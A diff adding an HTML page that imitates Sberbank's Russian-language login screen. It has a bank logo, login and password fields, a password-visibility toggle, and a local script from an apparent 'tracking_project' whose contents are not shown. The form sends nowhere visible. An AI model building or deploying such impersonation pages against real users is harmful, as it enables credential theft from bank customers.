@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>СберБанк - Вход</title>
+    <link rel="stylesheet" href="D:\April\tracking_project\static\css\style_1.css" />
+</head>
+<!-- "{{ url_for('static', filename='css/style_1.css') }}" -->
+
+<body>
+    <div class="container">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQXATfSmXc3VRO8Tdn9mDjZMHpZ3DyTGm_STA&s"
+            alt="Сбер Банк" class="logo" />
+
+        <h1>С возвращением!</h1>
+        <p>Введите номер телефона или логин и пароль, которые вы устанавливали при регистрации</p>
+
+        <form>
+            <label for="login">Номер телефона или логин</label>
+            <input type="text" id="login" name="login" required />
+
+            <label for="password">Пароль</label>
+            <div class="password-container">
+                <input type="password" id="password" name="password" required />
+                <span class="toggle-password">👁️</span>
+            </div>
+
+            <label class="checkbox">
+                <input type="checkbox" name="foreign-device" />
+                Вход с чужого устройства
+            </label>
+
+            <button type="submit" class="login-btn">Войти</button>
+
+            <a href="#" class="forgot">Не помню логин или пароль</a>
+        </form>
+    </div>
+
+    <script>
+        document.querySelector(".toggle-password").addEventListener("click", () => {
+            const password = document.getElementById("password");
+            password.type = password.type === "password" ? "text" : "password";
+        });
+    </script>
+    <script src="D:\April\tracking_project\static\js\track_example_2.js"></script>
+</body>
+
+</html>
